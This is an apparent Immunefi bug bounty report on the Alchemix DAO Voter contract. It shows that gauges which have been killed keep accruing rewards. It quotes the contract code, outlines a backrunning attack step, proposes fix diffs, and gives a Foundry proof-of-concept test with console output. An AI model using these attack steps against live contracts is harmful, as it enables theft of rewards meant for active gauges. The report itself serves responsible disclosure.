# 31408 - \[SC - Critical] Killed Gauge continue to accrue and steal rewar...

Submitted on May 18th 2024 at 15:36:49 UTC by @savi0ur for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31408

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Theft of unclaimed yield
* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Bug Description

Any rewards received by the `Voter` contract are indexed and distributed in proportion to each pool's weight in the `_updateFor()`, even if the gauge associated with that pool is killed.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L309-L322>

```solidity
function notifyRewardAmount(uint256 amount) external {
    require(msg.sender == minter, "only minter can send rewards");
    require(totalWeight > 0, "no votes");

    _safeTransferFrom(base, msg.sender, address(this), amount); // transfer rewards in

    uint256 _ratio = (amount * 1e18) / totalWeight; // 1e18 adjustment is removed during claim

    if (_ratio > 0) {
        index += _ratio;
    }

    emit NotifyReward(msg.sender, base, amount);
}
```

As we can see in `notifyRewardAmount()` which can be called by `Minter` contract whenever it need to send rewards to a `Voter` contract. This rewards share of each gauge based on `totalWeights` are stored in `index` variable.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L309-L322>

```solidity
function updateFor(address[] memory _gauges) external {
    for (uint256 i = 0; i < _gauges.length; i++) {
        _updateFor(_gauges[i]);
    }
}
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L469-L486>

```solidity
function _updateFor(address _gauge) internal {
    require(isGauge[_gauge], "invalid gauge");

    address _pool = poolForGauge[_gauge];
    uint256 _supplied = weights[_pool];
    if (_supplied > 0) {
        uint256 _supplyIndex = supplyIndex[_gauge];
        uint256 _index = index; // get global index0 for accumulated distro
        supplyIndex[_gauge] = _index; // update _gauge current position to global position
        uint256 _delta = _index - _supplyIndex; // see if there is any difference that need to be accrued
        if (_delta > 0) {
            uint256 _share = (uint256(_supplied) * _delta) / 1e18; // add accrued difference for each supplied token
            claimable[_gauge] += _share;
        }
    } else {
        supplyIndex[_gauge] = index;
    }
}
```

In `updateFor()`, each gauge's claimable share is tracked in `claimable` mapping, which gets updated whenever there is an accumulated reward (`index`) and its get distributed in proportion to each gauge's weight.

Note, there is no check of whether gauge is alive while updating gauge, which will allow any reward received in `Voter` contract to get accrued in a killed gauges, whereas it should not get accrued for killed gauge.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L293-L298>

```solidity
function killGauge(address _gauge) external {
    require(msg.sender == emergencyCouncil, "not emergency council");
    require(isAlive[_gauge], "gauge already dead");
    isAlive[_gauge] = false;
    emit GaugeKilled(_gauge);
}
```

Gauge is killed using `killGauge()`, it only set `isAlive[gauge] = false` and is still be eligible for reward as we have shown above.

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L341-L380>

```solidity
function distribute() external {
    uint256 start = 0;
    uint256 finish = pools.length;

    for (uint256 x = start; x < finish; x++) {
        // We don't revert if gauge is not alive since pools.length is not reduced
        if (isAlive[gauges[pools[x]]]) {
            _distribute(gauges[pools[x]]);
        }
    }

    IMinter(minter).updatePeriod();
}

function _distribute(address _gauge) internal {
    // Distribute once after epoch has ended
    require(
        block.timestamp >= IMinter(minter).activePeriod() + IMinter(minter).DURATION(),
        "can only distribute after period end"
    );

    uint256 _claimable = claimable[_gauge];

    // Reset claimable amount
    claimable[_gauge] = 0;

    _updateFor(_gauge);

    if (_claimable > 0) {
        IBaseGauge(_gauge).notifyRewardAmount(_claimable);
    }

    IBribe(bribes[_gauge]).resetVoting();

    emit DistributeReward(msg.sender, _gauge, _claimable);
}
```

In `distribute()`, which is supposed to get called in every epoch (mostly at the start of epoch), will distribute accrued reward tracked in `claimable[gauge]` to each individual gauge which is alive. So whenever `distribute()` gets called, it will cleared `claimable` mapping and send those claimable reward to the gauge.

Note, `claimable` mapping for killed gauge is still not changed, whereas for alive gauge its cleared and those claimable reward are sent to their respective gauge.

So whenever new rewards is sent to the `Voter` contract, attacker could call `updateFor()` with the gauge address of interest (Assuming attacker's interested gauge is killed) to steal and accrue share of reward from alive gauges in killed one.

This additional accrued share of rewards gets locked in a contract until the killed gauge is revived. But it should not have accrued reward in the first place when its killed. As its accruing reward, its basically sharing the share of reward which should belong to active gauges.

**Attack Step:**

* Attacker is interested in sushi gauge, but its already killed.
* Attacker monitor `notifyRewardAmount()` tx, backrun this tx and call `updateFor([sushiGaugeAddress])` to steal share of reward from other active gauges.

## Impact

Killed Gauge continue to accrue and steal rewards from `Minter` contract, which should belong to active gauges.

## Recommendation

Whenever gauge is killed, it should not accumulate rewards. In `_updateFor()`, it should send those rewards back to `minter` as shown below.

```diff
function _updateFor(address _gauge) internal {
    require(isGauge[_gauge], "invalid gauge");

    address _pool = poolForGauge[_gauge];
    uint256 _supplied = weights[_pool];
    if (_supplied > 0) {
        uint256 _supplyIndex = supplyIndex[_gauge];
        uint256 _index = index; // get global index0 for accumulated distro
        supplyIndex[_gauge] = _index; // update _gauge current position to global position
        uint256 _delta = _index - _supplyIndex; // see if there is any difference that need to be accrued
        if (_delta > 0) {
            uint256 _share = (uint256(_supplied) * _delta) / 1e18; // add accrued difference for each supplied token
-           claimable[_gauge] += _share;
+			if (isAlive[_gauge]) {
+				claimable[_gauge] += _share;
+           } else {
+				IERC20(base).transfer(minter, _share);
+			}
        }
    } else {
        supplyIndex[_gauge] = index;
    }
}
```

Its should also send the accumulated rewards to `Minter` contract when `killGauge()` is called as shown below.

```diff
function killGauge(address _gauge) external {
    require(msg.sender == emergencyCouncil, "not emergency council");
    require(isAlive[_gauge], "gauge already dead");
    isAlive[_gauge] = false;
+   // Return claimable rewards back to minter
+   uint256 _claimable = claimable[_gauge];
+   if (_claimable > 0) {
+	    IERC20(base).transfer(minter, _claimable);
+	    claimable[_gauge] = 0;
+	}
    emit GaugeKilled(_gauge);
}
```

## References

* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L309-L322>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L309-L322>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L469-L486>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L293-L298>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L341-L380>

## Proof Of Concept

In PoC, we have shown how `claimable` mapping is updated for the gauge even when gauge is killed.

**Steps to Run using Foundry:**

* Paste following foundry code in `src/test/Voting.t.sol`
* Run using `FOUNDRY_PROFILE=default forge test --fork-url $FORK_URL --fork-block-number 17133822 --match-contract VotingTest --match-test testKilledGaugeStealingShare -vv`

```solidity
// Check killed gauge is stealing ALCX token share from other gauge's
function testKilledGaugeStealingShare() public {
    // Create a token and vote to create votes
    uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, 3 weeks, false);

    uint256[] memory tokens = new uint256[](1);
    tokens[0] = tokenId1;

    address[] memory pools = new address[](2);
    pools[0] = sushiPoolAddress;
    pools[1] = balancerPoolAddress;
    uint256[] memory weights = new uint256[](2);
    weights[0] = 2500;
    weights[1] = 2500;

    hevm.prank(admin);
    voter.vote(tokenId1, pools, weights, 0);

    deal(address(alcx), address(minter), TOKEN_100K);

    uint256 minterAlcxBalance = IERC20(alcx).balanceOf(address(minter));
    assertEq(minterAlcxBalance, TOKEN_100K, "minter should have balance");

    uint256 voterAlcxBalance = IERC20(alcx).balanceOf(address(voter));
    assertEq(voterAlcxBalance, 0, "voter should have no balance");

    hevm.startPrank(address(minter));
    alcx.approve(address(voter), TOKEN_100K);
    voter.notifyRewardAmount(TOKEN_100K);
    hevm.stopPrank();

    uint256 minterAlcxBalanceAfter = IERC20(alcx).balanceOf(address(minter));
    assertEq(minterAlcxBalanceAfter, 0, "minter should have distributed its balance");

    uint256 voterAlcxBalanceAfter = IERC20(alcx).balanceOf(address(voter));
    assertEq(voterAlcxBalanceAfter, TOKEN_100K, "voter should have received balance");

    address[] memory gauges = new address[](2);
    gauges[0] = address(sushiGauge);
    gauges[1] = address(balancerGauge);
    voter.updateFor(gauges);

    uint claimableForSushiGaugeBefore = voter.claimable(address(sushiGauge));
    console.log("claimableForSushiGaugeBefore:", claimableForSushiGaugeBefore);
    uint claimableForBalancerGaugeBefore = voter.claimable(address(balancerGauge));
    console.log("claimableForBalancerGaugeBefore:", claimableForBalancerGaugeBefore);

    // Kill Sushi Gauge
    console.log("");
    console.log("Kill SushiGauge");
    hevm.prank(admin);
    voter.killGauge(address(sushiGauge));

    deal(address(alcx), address(minter), TOKEN_100K);
    hevm.startPrank(address(minter));
    alcx.approve(address(voter), TOKEN_100K);
    voter.notifyRewardAmount(TOKEN_100K);
    hevm.stopPrank();

    voter.updateFor(gauges);

    console.log("");
    uint claimableForSushiGaugeAfter = voter.claimable(address(sushiGauge));
    console.log("claimableForSushiGaugeAfter:", claimableForSushiGaugeAfter);
    uint claimableForBalancerGaugeAfter = voter.claimable(address(balancerGauge));
    console.log("claimableForBalancerGaugeAfter:", claimableForBalancerGaugeAfter);

    console.log("");
    // Claimable amount should increase for BalancerGauge
    console.log("Claimable amount should increase for BalancerGauge (claimableForBalancerGaugeAfter > claimableForBalancerGaugeBefore):", claimableForBalancerGaugeAfter > claimableForBalancerGaugeBefore);
    assertTrue(claimableForBalancerGaugeAfter > claimableForBalancerGaugeBefore);
    // Claimable amount should not increase for SushiGauge as its killed
    console.log("Claimable amount should not increase for SushiGauge as its killed (claimableForSushiGaugeBefore == claimableForSushiGaugeAfter):", claimableForSushiGaugeBefore == claimableForSushiGaugeAfter);
    assertFalse(claimableForSushiGaugeBefore == claimableForSushiGaugeAfter);
}
```

**Console Output:**

```shell
> FOUNDRY_PROFILE=default forge test --fork-url $FORK_URL --fork-block-number 17133822 --match-contract VotingTest --match-test testKilledGaugeStealingShare -vv

Ran 1 test for src/test/Voting.t.sol:VotingTest
[PASS] testKilledGaugeStealingShare() (gas: 2772935)
Logs:
  claimableForSushiGaugeBefore: 49999999999999999999999
  claimableForBalancerGaugeBefore: 49999999999999999999999
  
  Kill SushiGauge

  claimableForSushiGaugeAfter: 99999999999999999999998
  claimableForBalancerGaugeAfter: 99999999999999999999998

  Claimable amount should increase for BalancerGauge (claimableForBalancerGaugeAfter > claimableForBalancerGaugeBefore): true
  Claimable amount should not increase for SushiGauge as its killed (claimableForSushiGaugeBefore == claimableForSushiGaugeAfter): false
```
